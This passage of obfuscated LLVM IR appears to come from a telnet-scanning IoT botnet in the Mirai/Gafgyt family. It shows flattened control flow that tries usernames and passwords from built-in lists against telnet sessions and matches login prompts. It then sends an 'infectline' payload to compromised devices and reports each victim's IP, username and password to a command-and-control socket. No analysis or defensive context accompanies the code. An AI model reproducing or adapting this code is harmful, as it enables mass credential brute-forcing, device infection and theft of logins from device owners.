  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload77, i64 %736
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %737, i32 0, i32 3
  store i8 1, i8* %738, align 1
  store i32 244697961, i32* %switchVar
  br label %loopEnd

; <label>:739:                                    ; preds = %loopEntry
  store i32 1729329605, i32* %switchVar
  br label %loopEnd

; <label>:740:                                    ; preds = %loopEntry
  %741 = load i32, i32* %2, align 4
  %742 = sext i32 %741 to i64
  %.reload76 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload76, i64 %742
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %743, i32 0, i32 0
  %745 = load i32, i32* %744, align 16
  %746 = load i32, i32* %2, align 4
  %747 = sext i32 %746 to i64
  %.reload75 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload75, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 5
  %750 = load i8, i8* %749, align 1
  %751 = zext i8 %750 to i64
  %752 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %751
  %753 = load i8*, i8** %752, align 8
  %754 = load i32, i32* %2, align 4
  %755 = sext i32 %754 to i64
  %.reload74 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload74, i64 %755
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %756, i32 0, i32 5
  %758 = load i8, i8* %757, align 1
  %759 = zext i8 %758 to i64
  %760 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %759
  %761 = load i8*, i8** %760, align 8
  %762 = call i64 @strlen(i8* %761) #10
  %763 = call i64 @send(i32 %745, i8* %753, i64 %762, i32 16384)
  %764 = icmp slt i64 %763, 0
  %765 = select i1 %764, i32 1186893656, i32 1915860606
  store i32 %765, i32* %switchVar
  br label %loopEnd

; <label>:766:                                    ; preds = %loopEntry
  %767 = load i32, i32* %2, align 4
  %768 = sext i32 %767 to i64
  %.reload73 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload73, i64 %768
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %769, i32 0, i32 0
  %771 = load i32, i32* %770, align 16
  %772 = call i32 @sclose(i32 %771)
  %773 = load i32, i32* %2, align 4
  %774 = sext i32 %773 to i64
  %.reload72 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload72, i64 %774
  %776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %775, i32 0, i32 2
  store i8 0, i8* %776, align 8
  %777 = load i32, i32* %2, align 4
  %778 = sext i32 %777 to i64
  %.reload71 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload71, i64 %778
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %779, i32 0, i32 3
  store i8 1, i8* %780, align 1
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:781:                                    ; preds = %loopEntry
  %782 = load i32, i32* %2, align 4
  %783 = sext i32 %782 to i64
  %.reload70 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload70, i64 %783
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %784, i32 0, i32 0
  %786 = load i32, i32* %785, align 16
  %787 = call i64 @send(i32 %786, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i32 0, i32 0), i64 2, i32 16384)
  %788 = icmp slt i64 %787, 0
  %789 = select i1 %788, i32 1466926842, i32 -1551062616
  store i32 %789, i32* %switchVar
  br label %loopEnd

; <label>:790:                                    ; preds = %loopEntry
  %791 = load i32, i32* %2, align 4
  %792 = sext i32 %791 to i64
  %.reload69 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload69, i64 %792
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %793, i32 0, i32 0
  %795 = load i32, i32* %794, align 16
  %796 = call i32 @sclose(i32 %795)
  %797 = load i32, i32* %2, align 4
  %798 = sext i32 %797 to i64
  %.reload68 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload68, i64 %798
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %799, i32 0, i32 2
  store i8 0, i8* %800, align 8
  %801 = load i32, i32* %2, align 4
  %802 = sext i32 %801 to i64
  %.reload67 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload67, i64 %802
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %803, i32 0, i32 3
  store i8 1, i8* %804, align 1
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:805:                                    ; preds = %loopEntry
  %806 = load i32, i32* %2, align 4
  %807 = sext i32 %806 to i64
  %.reload66 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload66, i64 %807
  %809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %808, i32 0, i32 2
  store i8 6, i8* %809, align 8
  store i32 1729329605, i32* %switchVar
  br label %loopEnd

; <label>:810:                                    ; preds = %loopEntry
  %811 = load i32, i32* %2, align 4
  %812 = sext i32 %811 to i64
  %.reload65 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload65, i64 %812
  %814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %813, i32 0, i32 6
  %815 = load i32, i32* %814, align 4
  %816 = icmp eq i32 %815, 0
  %817 = select i1 %816, i32 -1260053952, i32 632609666
  store i32 %817, i32* %switchVar
  br label %loopEnd

; <label>:818:                                    ; preds = %loopEntry
  %819 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %820 = load i32, i32* %2, align 4
  %821 = sext i32 %820 to i64
  %.reload64 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload64, i64 %821
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %822, i32 0, i32 6
  store i32 %819, i32* %823, align 4
  store i32 632609666, i32* %switchVar
  br label %loopEnd

; <label>:824:                                    ; preds = %loopEntry
  %825 = load i32, i32* %2, align 4
  %826 = sext i32 %825 to i64
  %.reload63 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload63, i64 %826
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %827, i32 0, i32 0
  %829 = load i32, i32* %828, align 16
  %830 = load i32, i32* %2, align 4
  %831 = sext i32 %830 to i64
  %.reload62 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload62, i64 %831
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %832, i32 0, i32 8
  %834 = load i8*, i8** %833, align 8
  %835 = load i32, i32* %2, align 4
  %836 = sext i32 %835 to i64
  %.reload61 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload61, i64 %836
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %837, i32 0, i32 7
  %839 = load i16, i16* %838, align 16
  %840 = zext i16 %839 to i32
  %841 = call i32 @readUntil(i32 %829, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %834, i32 1024, i32 %840)
  %842 = icmp ne i32 %841, 0
  %843 = select i1 %842, i32 -640661026, i32 1794224934
  store i32 %843, i32* %switchVar
  br label %loopEnd

; <label>:844:                                    ; preds = %loopEntry
  %845 = load i32, i32* %2, align 4
  %846 = sext i32 %845 to i64
  %.reload60 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload60, i64 %846
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %847, i32 0, i32 6
  store i32 0, i32* %848, align 4
  %849 = load i32, i32* %2, align 4
  %850 = sext i32 %849 to i64
  %.reload59 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload59, i64 %850
  %852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %851, i32 0, i32 7
  store i16 0, i16* %852, align 16
  %853 = load i32, i32* %2, align 4
  %854 = sext i32 %853 to i64
  %.reload58 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload58, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 8
  %857 = load i8*, i8** %856, align 8
  %858 = call i8* @strstr(i8* %857, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i32 0, i32 0)) #10
  %859 = icmp ne i8* %858, null
  %860 = select i1 %859, i32 -1238998804, i32 807031445
  store i32 %860, i32* %switchVar
  br label %loopEnd

; <label>:861:                                    ; preds = %loopEntry
  %862 = load i32, i32* %2, align 4
  %863 = sext i32 %862 to i64
  %.reload57 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload57, i64 %863
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %864, i32 0, i32 8
  %866 = load i8*, i8** %865, align 8
  call void @llvm.memset.p0i8.i64(i8* %866, i8 0, i64 1024, i32 1, i1 false)
  %867 = load i32, i32* %2, align 4
  %868 = sext i32 %867 to i64
  %.reload56 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload56, i64 %868
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %869, i32 0, i32 0
  %871 = load i32, i32* %870, align 16
  %872 = call i32 @sclose(i32 %871)
  %873 = load i32, i32* %2, align 4
  %874 = sext i32 %873 to i64
  %.reload55 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload55, i64 %874
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %875, i32 0, i32 2
  store i8 0, i8* %876, align 8
  %877 = load i32, i32* %2, align 4
  %878 = sext i32 %877 to i64
  %.reload54 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload54, i64 %878
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %879, i32 0, i32 3
  store i8 0, i8* %880, align 1
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:881:                                    ; preds = %loopEntry
  %882 = load i32, i32* %2, align 4
  %883 = sext i32 %882 to i64
  %.reload53 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload53, i64 %883
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %884, i32 0, i32 8
  %886 = load i8*, i8** %885, align 8
  %887 = call i32 @matchPrompt(i8* %886)
  %888 = icmp ne i32 %887, 0
  %889 = select i1 %888, i32 1127872437, i32 -2044842187
  store i32 %889, i32* %switchVar
  br label %loopEnd

; <label>:890:                                    ; preds = %loopEntry
  %891 = load i32, i32* %2, align 4
  %892 = sext i32 %891 to i64
  %.reload52 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload52, i64 %892
  %894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %893, i32 0, i32 8
  %895 = load i8*, i8** %894, align 8
  call void @llvm.memset.p0i8.i64(i8* %895, i8 0, i64 1024, i32 1, i1 false)
  %896 = load i32, i32* %2, align 4
  %897 = sext i32 %896 to i64
  %.reload51 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload51, i64 %897
  %899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %898, i32 0, i32 0
  %900 = load i32, i32* %899, align 16
  %901 = call i32 @sclose(i32 %900)
  %902 = load i32, i32* %2, align 4
  %903 = sext i32 %902 to i64
  %.reload50 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload50, i64 %903
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %904, i32 0, i32 2
  store i8 0, i8* %905, align 8
  %906 = load i32, i32* %2, align 4
  %907 = sext i32 %906 to i64
  %.reload49 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload49, i64 %907
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %908, i32 0, i32 3
  store i8 1, i8* %909, align 1
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:910:                                    ; preds = %loopEntry
  %911 = load i32, i32* %2, align 4
  %912 = sext i32 %911 to i64
  %.reload48 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload48, i64 %912
  %914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %913, i32 0, i32 2
  store i8 7, i8* %914, align 8
  store i32 -12158228, i32* %switchVar
  br label %loopEnd

; <label>:915:                                    ; preds = %loopEntry
  %916 = load i32, i32* %2, align 4
  %917 = sext i32 %916 to i64
  %.reload47 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload47, i64 %917
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %918, i32 0, i32 8
  %920 = load i8*, i8** %919, align 8
  call void @llvm.memset.p0i8.i64(i8* %920, i8 0, i64 1024, i32 1, i1 false)
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:921:                                    ; preds = %loopEntry
  %922 = load i32, i32* %2, align 4
  %923 = sext i32 %922 to i64
  %.reload46 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload46, i64 %923
  %925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %924, i32 0, i32 8
  %926 = load i8*, i8** %925, align 8
  %927 = call i64 @strlen(i8* %926) #10
  %928 = trunc i64 %927 to i16
  %929 = load i32, i32* %2, align 4
  %930 = sext i32 %929 to i64
  %.reload45 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload45, i64 %930
  %932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %931, i32 0, i32 7
  store i16 %928, i16* %932, align 16
  store i32 -44693808, i32* %switchVar
  br label %loopEnd

; <label>:933:                                    ; preds = %loopEntry
  %934 = load i32, i32* %2, align 4
  %935 = sext i32 %934 to i64
  %.reload44 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload44, i64 %935
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %936, i32 0, i32 6
  %938 = load i32, i32* %937, align 4
  %939 = add i32 %938, 30
  %940 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %941 = icmp ult i32 %939, %940
  %942 = select i1 %941, i32 214912010, i32 1754148358
  store i32 %942, i32* %switchVar
  br label %loopEnd

; <label>:943:                                    ; preds = %loopEntry
  %944 = load i32, i32* %2, align 4
  %945 = sext i32 %944 to i64
  %.reload43 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload43, i64 %945
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %946, i32 0, i32 0
  %948 = load i32, i32* %947, align 16
  %949 = call i32 @sclose(i32 %948)
  %950 = load i32, i32* %2, align 4
  %951 = sext i32 %950 to i64
  %.reload42 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload42, i64 %951
  %953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %952, i32 0, i32 2
  store i8 0, i8* %953, align 8
  %954 = load i32, i32* %2, align 4
  %955 = sext i32 %954 to i64
  %.reload41 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload41, i64 %955
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %956, i32 0, i32 3
  store i8 1, i8* %957, align 1
  store i32 1754148358, i32* %switchVar
  br label %loopEnd

; <label>:958:                                    ; preds = %loopEntry
  store i32 1729329605, i32* %switchVar
  br label %loopEnd

; <label>:959:                                    ; preds = %loopEntry
  %960 = load i32, i32* %2, align 4
  %961 = sext i32 %960 to i64
  %.reload40 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload40, i64 %961
  %963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %962, i32 0, i32 0
  %964 = load i32, i32* %963, align 16
  %965 = call i64 @send(i32 %964, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.79, i32 0, i32 0), i64 4, i32 16384)
  %966 = icmp slt i64 %965, 0
  %967 = select i1 %966, i32 -2132064941, i32 -1618804612
  store i32 %967, i32* %switchVar
  br label %loopEnd

; <label>:968:                                    ; preds = %loopEntry
  %969 = load i32, i32* %2, align 4
  %970 = sext i32 %969 to i64
  %.reload39 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload39, i64 %970
  %972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %971, i32 0, i32 0
  %973 = load i32, i32* %972, align 16
  %974 = call i32 @sclose(i32 %973)
  %975 = load i32, i32* %2, align 4
  %976 = sext i32 %975 to i64
  %.reload38 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload38, i64 %976
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %977, i32 0, i32 2
  store i8 0, i8* %978, align 8
  %979 = load i32, i32* %2, align 4
  %980 = sext i32 %979 to i64
  %.reload37 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload37, i64 %980
  %982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %981, i32 0, i32 3
  store i8 1, i8* %982, align 1
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:983:                                    ; preds = %loopEntry
  %984 = load i32, i32* %2, align 4
  %985 = sext i32 %984 to i64
  %.reload36 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload36, i64 %985
  %987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %986, i32 0, i32 2
  store i8 8, i8* %987, align 8
  store i32 1729329605, i32* %switchVar
  br label %loopEnd

; <label>:988:                                    ; preds = %loopEntry
  %989 = load i32, i32* %2, align 4
  %990 = sext i32 %989 to i64
  %.reload35 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload35, i64 %990
  %992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %991, i32 0, i32 6
  %993 = load i32, i32* %992, align 4
  %994 = icmp eq i32 %993, 0
  %995 = select i1 %994, i32 799219278, i32 -990461979
  store i32 %995, i32* %switchVar
  br label %loopEnd

; <label>:996:                                    ; preds = %loopEntry
  %997 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %998 = load i32, i32* %2, align 4
  %999 = sext i32 %998 to i64
  %.reload34 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload34, i64 %999
  %1001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1000, i32 0, i32 6
  store i32 %997, i32* %1001, align 4
  store i32 -990461979, i32* %switchVar
  br label %loopEnd

; <label>:1002:                                   ; preds = %loopEntry
  %1003 = load i32, i32* %2, align 4
  %1004 = sext i32 %1003 to i64
  %.reload33 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload33, i64 %1004
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1005, i32 0, i32 0
  %1007 = load i32, i32* %1006, align 16
  %1008 = load i8*, i8** @infectline, align 8
  %1009 = load i8*, i8** @infectline, align 8
  %1010 = call i64 @strlen(i8* %1009) #10
  %1011 = call i64 @send(i32 %1007, i8* %1008, i64 %1010, i32 16384)
  %1012 = icmp slt i64 %1011, 0
  %1013 = select i1 %1012, i32 1320983696, i32 2115316885
  store i32 %1013, i32* %switchVar
  br label %loopEnd

; <label>:1014:                                   ; preds = %loopEntry
  %1015 = load i32, i32* %2, align 4
  %1016 = sext i32 %1015 to i64
  %.reload32 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload32, i64 %1016
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1017, i32 0, i32 0
  %1019 = load i32, i32* %1018, align 16
  %1020 = call i32 @sclose(i32 %1019)
  %1021 = load i32, i32* %2, align 4
  %1022 = sext i32 %1021 to i64
  %.reload31 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload31, i64 %1022
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1023, i32 0, i32 2
  store i8 0, i8* %1024, align 8
  %1025 = load i32, i32* %2, align 4
  %1026 = sext i32 %1025 to i64
  %.reload30 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload30, i64 %1026
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1027, i32 0, i32 3
  store i8 1, i8* %1028, align 1
  %1029 = load i32, i32* %2, align 4
  %1030 = sext i32 %1029 to i64
  %.reload29 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1031 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload29, i64 %1030
  %1032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1031, i32 0, i32 8
  %1033 = load i8*, i8** %1032, align 8
  call void @llvm.memset.p0i8.i64(i8* %1033, i8 0, i64 1024, i32 1, i1 false)
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:1034:                                   ; preds = %loopEntry
  %1035 = load i32, i32* @mainCommSock, align 4
  %1036 = load i32, i32* %2, align 4
  %1037 = sext i32 %1036 to i64
  %.reload28 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload28, i64 %1037
  %1039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1038, i32 0, i32 1
  %1040 = bitcast i32* %1039 to %struct.in_addr*
  %1041 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1040, i32 0, i32 0
  %1042 = load i32, i32* %1041, align 4
  %1043 = call i8* @inet_ntoa(i32 %1042) #2
  %1044 = load i32, i32* %2, align 4
  %1045 = sext i32 %1044 to i64
  %.reload27 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload27, i64 %1045
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1046, i32 0, i32 4
  %1048 = load i8, i8* %1047, align 2
  %1049 = zext i8 %1048 to i64
  %1050 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %1049
  %1051 = load i8*, i8** %1050, align 8
  %1052 = load i32, i32* %2, align 4
  %1053 = sext i32 %1052 to i64
  %.reload26 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload26, i64 %1053
  %1055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1054, i32 0, i32 5
  %1056 = load i8, i8* %1055, align 1
  %1057 = zext i8 %1056 to i64
  %1058 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %1057
  %1059 = load i8*, i8** %1058, align 8
  %1060 = call i32 (i32, i8*, ...) @sockprintf(i32 %1035, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.80, i32 0, i32 0), i8* %1043, i8* %1051, i8* %1059)
  %1061 = load i32, i32* %2, align 4
  %1062 = sext i32 %1061 to i64
  %.reload25 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload25, i64 %1062
  %1064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1063, i32 0, i32 6
  %1065 = load i32, i32* %1064, align 4
  %1066 = add i32 %1065, 8
  %1067 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1068 = icmp ult i32 %1066, %1067
  %1069 = select i1 %1068, i32 292964970, i32 -1305401158
  store i32 %1069, i32* %switchVar
  br label %loopEnd

; <label>:1070:                                   ; preds = %loopEntry
  %1071 = load i32, i32* @mainCommSock, align 4
  %1072 = load i32, i32* %2, align 4
  %1073 = sext i32 %1072 to i64
  %.reload24 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1074 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload24, i64 %1073
  %1075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1074, i32 0, i32 1
  %1076 = bitcast i32* %1075 to %struct.in_addr*
  %1077 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1076, i32 0, i32 0
  %1078 = load i32, i32* %1077, align 4
  %1079 = call i8* @inet_ntoa(i32 %1078) #2
  %1080 = load i32, i32* %2, align 4
  %1081 = sext i32 %1080 to i64
  %.reload23 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1082 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload23, i64 %1081
  %1083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1082, i32 0, i32 4
  %1084 = load i8, i8* %1083, align 2
  %1085 = zext i8 %1084 to i64
  %1086 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %1085
  %1087 = load i8*, i8** %1086, align 8
  %1088 = load i32, i32* %2, align 4
  %1089 = sext i32 %1088 to i64
  %.reload22 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload22, i64 %1089
  %1091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1090, i32 0, i32 5
  %1092 = load i8, i8* %1091, align 1
  %1093 = zext i8 %1092 to i64
  %1094 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %1093
  %1095 = load i8*, i8** %1094, align 8
  %1096 = call i32 (i32, i8*, ...) @sockprintf(i32 %1071, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.81, i32 0, i32 0), i8* %1079, i8* %1087, i8* %1095)
  %1097 = load i32, i32* %2, align 4
  %1098 = sext i32 %1097 to i64
  %.reload21 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload21, i64 %1098
  %1100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1099, i32 0, i32 0
  %1101 = load i32, i32* %1100, align 16
  %1102 = call i32 @sclose(i32 %1101)
  %1103 = load i32, i32* %2, align 4
  %1104 = sext i32 %1103 to i64
